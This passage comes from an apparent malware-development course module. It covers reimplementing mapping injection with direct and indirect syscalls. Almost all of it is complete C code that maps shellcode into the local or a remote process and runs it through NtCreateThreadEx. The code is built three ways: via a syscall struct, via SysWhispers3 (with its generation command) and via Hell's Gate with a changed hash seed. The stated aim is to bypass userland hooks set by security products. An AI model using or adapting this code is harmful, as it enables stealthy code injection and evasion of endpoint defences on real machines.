	printf(&quot;[+] DONE \n&quot;);
	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmpaing the local view - only when the payload is done executing
	if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	// Closing the section handle
	if ((STATUS = St.pNtClose(hSection)) != 0) {
		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre><h3 id="5f52550c-c512-44f1-9d32-3897e23ec955" class=""><strong>RemoteMappingInjectionViaSyscalls</strong></h3><pre id="f638256a-f388-415f-8c8b-f6cfd64027f4" class="code code-wrap"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
					    pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize 		= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};
	Syscall				St				    = { 0 };


	if (!InitializeSyscallStruct(&amp;St)) {
		printf(&quot;[!] Could Not Initialize The Syscall Struct \n&quot;);
		return FALSE;
	}

//--------------------------------------------------------------------------
	// Allocating local map view

	if ((STATUS = St.pNtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	if ((STATUS = St.pNtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewUnmap, NULL, PAGE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	printf(&quot;[+] Local Memory Allocated At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// Allocating remote map view
	if ((STATUS = St.pNtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] Remote Memory Allocated At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation
	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pRemoteAddress);
	if ((STATUS = St.pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);
	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	if ((STATUS = St.pNtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}


	// Closing the section handle
	if ((STATUS = St.pNtClose(hSection)) != 0) {
		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	return TRUE;
}

</code></pre><p id="23f58278-2bbd-418d-8c39-c225163d7941" class="">The <code>NtUnmapViewOfSection</code> function should only be executed after the payload has finished executing. Attempting to unmap the mapped local view while the payload is still running could break the payload execution or cause a process to crash. As an alternative, the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntwaitforsingleobject">NtWaitForSingleObject</a> syscall can be used to wait until the thread is finished, after which the <code>NtUnmapViewOfSection</code> syscall can be performed to clean up the mapped payload, though this is left as an exercise to the reader.</p><h3 id="b12e4ed0-0cc0-43e0-8a99-4c5daf6d894d" class=""><strong>Implementation Using SysWhispers</strong></h3><p id="a30e9929-6116-48ac-8f09-056ed6911dc6" class="">The implementation here uses SysWhispers3 to bypass userland hooks via direct syscalls. The following command is used to generate the required files for this implementation.</p><pre id="f4e28425-9cf0-4c24-960e-6924105db694" class="code code-wrap"><code>python syswhispers.py -a x64 -c msvc -m jumper_randomized -f NtCreateSection,NtMapViewOfSection,NtUnmapViewOfSection,NtClose,NtCreateThreadEx -o SysWhispers -v*
</code></pre><p id="0cce01f7-7c56-432c-adb2-53dc25e3301d" class="">Three files are generated: <code>SysWhispers.h</code>, <code>SysWhispers.c</code> and <code>SysWhispers-asm.x64.asm</code>. The next step is to import these files into Visual Studio as demonstrated in the previous module. <code>LocalMappingInjectionViaSyscalls</code> and <code>RemoteMappingInjectionViaSyscalls</code> are shown below.</p><h3 id="e1813185-8aa0-4f01-a6a7-2b55bbea9c08" class=""><strong>LocalMappingInjectionViaSyscalls</strong></h3><pre id="d9881a80-29b5-4d31-a4c6-672f1e19940d" class="code code-wrap"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection		= NULL;
	HANDLE				hThread			= NULL;
	PVOID				pAddress		= NULL;
	NTSTATUS			STATUS			= NULL;
	SIZE_T				sViewSize		= NULL;
	LARGE_INTEGER		MaximumSize		= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// Allocating local map view

	if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %d \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation

	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);
	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pAddress)) != 0) {
		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	// Closing the section handle
	if ((STATUS = NtClose(hSection)) != 0) {
		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre><h3 id="a3de1c76-261c-4ff1-a465-b574d48329da" class=""><strong>RemoteMappingInjectionViaSyscalls</strong></h3><pre id="ae78d856-f681-4596-9da1-67ecc219e897" class="code code-wrap"><code>BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
					    pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize 		= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// Allocating local map view

	if ((STATUS = NtCreateSection(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	if ((STATUS = NtMapViewOfSection(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	printf(&quot;[+] Local Memory Allocated At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// Allocating remote map view
	if ((STATUS = NtMapViewOfSection(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	printf(&quot;[+] Remote Memory Allocated At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation
	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pRemoteAddress);
	if ((STATUS = NtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);
	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	if ((STATUS = NtUnmapViewOfSection((HANDLE)-1, pLocalAddress)) != 0) {
		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	// Closing the section handle
	if ((STATUS = NtClose(hSection)) != 0) {
		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	return TRUE;
}

</code></pre><h3 id="227fea63-1ad2-4e53-a996-02f6e96c3243" class=""><strong>Implementation Using Hell&#x27;s Gate</strong></h3><p id="de29b98a-aaf5-4c3d-8980-6f287e0ac25c" class="">The last implementation for this module is using Hell&#x27;s Gate. First, ensure that the same steps done to set up the Visual Studio project with SysWhispers3 are done here too. Specifically, enabling MASM and modifying the properties to set the ASM file to be compiled using the Microsoft Macro Assembler.</p><h3 id="42245dbb-56ad-4385-872d-7e22177daa3d" class=""><strong>Updating The VX_TABLE Structure</strong></h3><pre id="e2faa399-3a97-406b-8fa4-f4f771870aa3" class="code code-wrap"><code>typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
} VX_TABLE, * PVX_TABLE;
</code></pre><h3 id="9a97610d-33c7-485b-90ca-1c6430e16adb" class=""><strong>Updating Seed Value</strong></h3><p id="0447b3d1-d0ae-4faf-a18f-2b9bc2ce464c" class="">A new seed value will be used to replace the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L93">old one</a> to change the hash values of the syscalls. The djb2 hashing function is updated with the new seed value below.</p><pre id="7a480952-4f2a-4db9-98fe-34c207157cd2" class="code code-wrap"><code>DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF; // Old value: 0x7734773477347734
	INT c;

	while (c = *str++)
		dwHash = ((dwHash &lt;&lt; 0x5) + dwHash) + c;

	return dwHash;
}
</code></pre><p id="c7815696-d282-4fe8-a663-8cff2c6fe146" class="">The following <code>printf</code> statements should be added to a new project to generate the djb2 hash values.</p><pre id="f907a95b-bc19-48e4-9438-f422bf7b042a" class="code code-wrap"><code>printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateSection&quot;, &quot;_djb2&quot;, (DWORD64)djb2(&quot;NtCreateSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtMapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtMapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtUnmapViewOfSection&quot;, &quot;_djb2&quot;, djb2(&quot;NtUnmapViewOfSection&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtClose&quot;, &quot;_djb2&quot;, djb2(&quot;NtClose&quot;));
printf(&quot;#define %s%s 0x%p \n&quot;, &quot;NtCreateThreadEx&quot;, &quot;_djb2&quot;, djb2(&quot;NtCreateThreadEx&quot;));
</code></pre><p id="93cadbaf-51d1-4c05-9ffb-11a60a5c8053" class="">Once the values are generated, add them to the start of the Hell&#x27;s Gate project.</p><pre id="c0cfd8a8-ca9a-46f5-a850-98fa82389a84" class="code code-wrap"><code>#define NtCreateSection_djb2         0x5687F81AC5D1497A#define NtMapViewOfSection_djb2      0x0778E82F702E79D4#define NtUnmapViewOfSection_djb2    0x0BF2A46A27B93797#define NtClose_djb2                 0x0DA4FA80EF5031E7#define NtCreateThreadEx_djb2        0x2786FB7E75145F1A</code></pre><h3 id="f1639310-6b59-4b36-a9fa-ab2eb22d54b1" class=""><strong>Updating The Main Function</strong></h3><p id="92bd0c74-1b06-4177-87c5-e2c1de03255b" class="">The main function must be updated to use either the <code>LocalMappingInjectionViaSyscalls</code> or <code>RemoteMappingInjectionViaSyscalls</code> functions instead of the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L80">payload function</a>. The function will use the above-generated hashes as shown below.</p><h3 id="22ab48b2-2da2-4650-9418-6b66f4c6b9c6" class=""><strong>LocalMappingInjectionViaSyscalls</strong></h3><pre id="39c3f2b0-ece0-4879-91b6-3c994211b670" class="code code-wrap"><code>BOOL LocalMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection		= NULL;
	HANDLE				hThread			= NULL;
	PVOID				pAddress		= NULL;
	NTSTATUS			STATUS			= NULL;
	SIZE_T				sViewSize		= NULL;
	LARGE_INTEGER		MaximumSize 	= {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// Allocating local map view
	HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] Allocated Address At : 0x%p Of Size : %ld \n&quot;, pAddress, sViewSize);

//--------------------------------------------------------------------------
	// Writing the payload

	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	memcpy(pAddress, pPayload, sPayloadSize);
	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pAddress);
	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();

//--------------------------------------------------------------------------

	// Executing the payload via thread creation

	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pAddress);
	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);
	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));


//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pAddress)) != 0) {
		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	// Closing the section handle
	HellsGate(pVxTable-&gt;NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	return TRUE;
}

</code></pre><h3 id="69707689-8871-45f6-8e30-42ea37bf3271" class=""><strong>RemoteMappingInjectionViaSyscalls</strong></h3><pre id="b2b9fbc3-f983-4bdd-b7b2-88b3c690e74e" class="code code-wrap"><code>BOOL RemoteMappingInjectionViaSyscalls(IN PVX_TABLE pVxTable, IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize) {

	HANDLE				hSection			= NULL;
	HANDLE				hThread				= NULL;
	PVOID				pLocalAddress		= NULL,
					    pRemoteAddress		= NULL;
	NTSTATUS			STATUS				= NULL;
	SIZE_T				sViewSize			= NULL;
	LARGE_INTEGER		MaximumSize 	    = {
			.HighPart = 0,
			.LowPart = sPayloadSize
	};

//--------------------------------------------------------------------------
	// Allocating local map view

	HellsGate(pVxTable-&gt;NtCreateSection.wSystemCall);
	if ((STATUS = HellDescent(&amp;hSection, SECTION_ALL_ACCESS, NULL, &amp;MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) {
		printf(&quot;[!] NtCreateSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, (HANDLE)-1, &amp;pLocalAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	printf(&quot;[+] Local Memory Allocated At : 0x%p Of Size : %d \n&quot;, pLocalAddress, sViewSize);

//--------------------------------------------------------------------------

	// Writing the payload
	printf(&quot;[#] Press &lt;Enter&gt; To Write The Payload ... &quot;);
	getchar();
	memcpy(pLocalAddress, pPayload, sPayloadSize);
	printf(&quot;\t[+] Payload is Copied From 0x%p To 0x%p \n&quot;, pPayload, pLocalAddress);

//--------------------------------------------------------------------------

	// Allocating remote map view
	HellsGate(pVxTable-&gt;NtMapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent(hSection, hProcess, &amp;pRemoteAddress, NULL, NULL, NULL, &amp;sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf(&quot;[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	printf(&quot;[+] Remote Memory Allocated At : 0x%p Of Size : %d \n&quot;, pRemoteAddress, sViewSize);

//--------------------------------------------------------------------------

	// Executing the payload via thread creation
	printf(&quot;[#] Press &lt;Enter&gt; To Run The Payload ... &quot;);
	getchar();
	printf(&quot;\t[i] Running Thread Of Entry 0x%p ... &quot;, pRemoteAddress);
	HellsGate(pVxTable-&gt;NtCreateThreadEx.wSystemCall);
	if ((STATUS = HellDescent(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {
		printf(&quot;[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}
	printf(&quot;[+] DONE \n&quot;);
	printf(&quot;\t[+] Thread Created With Id : %d \n&quot;, GetThreadId(hThread));

//--------------------------------------------------------------------------

	// Unmapping the local view - only when the payload is done executing
	HellsGate(pVxTable-&gt;NtUnmapViewOfSection.wSystemCall);
	if ((STATUS = HellDescent((HANDLE)-1, pLocalAddress)) != 0) {
		printf(&quot;[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	// Closing the section handle
	HellsGate(pVxTable-&gt;NtClose.wSystemCall);
	if ((STATUS = HellDescent(hSection)) != 0) {
		printf(&quot;[!] NtClose Failed With Error : 0x%0.8X \n&quot;, STATUS);
		return FALSE;
	}

	return TRUE;
}
</code></pre><h3 id="ec31a7c0-187b-47fe-bdae-ce845e5df99b" class=""><strong>Local vs Remote Injection</strong></h3><p id="21b14a42-984e-4472-9f1a-41bf0ed2f785" class="">Similar to the previous module, a preprocessor macro code was constructed to target the local process if <code>LOCAL_INJECTION</code> is defined. The preprocessor code is shown below.</p><pre id="9853d884-7227-40e4-b67a-245ad61c9ca9" class="code code-wrap"><code>#define LOCAL_INJECTION#ifndef LOCAL_INJECTION#define REMOTE_INJECTION// Set the target process PID
#define PROCESS_ID	18784	#endif // !LOCAL_INJECTION</code></pre><h3 id="d84839f1-10e8-4bf5-98c1-9481d1aadf9f" class=""><strong>Demo</strong></h3><p id="5d16e872-67e0-4b9f-a38b-e00ca7ab80d9" class="">Using the SysWhispers implementation locally.</p><figure id="8c67baa1-fd39-411c-9d50-cc01a7747848" class="image"><a href="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-214533288-cc53802f-345d-4eb3-896a-fb4d7dc61b27.png"><img style="width:1909px" src="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-214533288-cc53802f-345d-4eb3-896a-fb4d7dc61b27.png"/></a></figure><p id="2f14eca9-669d-4aa2-9fce-08de39b0d691" class="">Using SysWhispers implementation remotely.</p><figure id="49a3f533-9e5b-495e-8951-ed097969a4f4" class="image"><a href="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-314533763-efe02370-e08e-4d13-9c4c-884931855bdc.png"><img style="width:1830px" src="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-314533763-efe02370-e08e-4d13-9c4c-884931855bdc.png"/></a></figure><p id="c94e9b0f-684d-41c8-b243-3b1fe5e0c5be" class="">Using Hell&#x27;s Gate implementation locally.</p><figure id="a3da2ac4-42b4-49d6-a2b9-5e94f06db312" class="image"><a href="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-414534077-da2c3b3e-fcac-4691-9e1e-261b6380e7cb.png"><img style="width:1830px" src="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-414534077-da2c3b3e-fcac-4691-9e1e-261b6380e7cb.png"/></a></figure><p id="c18c24c0-e0bf-4733-8a8b-65470848c398" class="">Using Hell&#x27;s Gate implementation remotely.</p><figure id="8aaafe50-4b99-4d8b-814e-7855666756d4" class="image"><a href="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-514534407-34d19c71-70d1-4669-99c0-6b3ce6a64d9e.png"><img style="width:1836px" src="68%20Syscalls%20-%20Reimplementing%20Mapping%20Injection%202f2302d29c4b4300bc09befcc91e503c/syscall-mapping-514534407-34d19c71-70d1-4669-99c0-6b3ce6a64d9e.png"/></a></figure></div></article></body></html>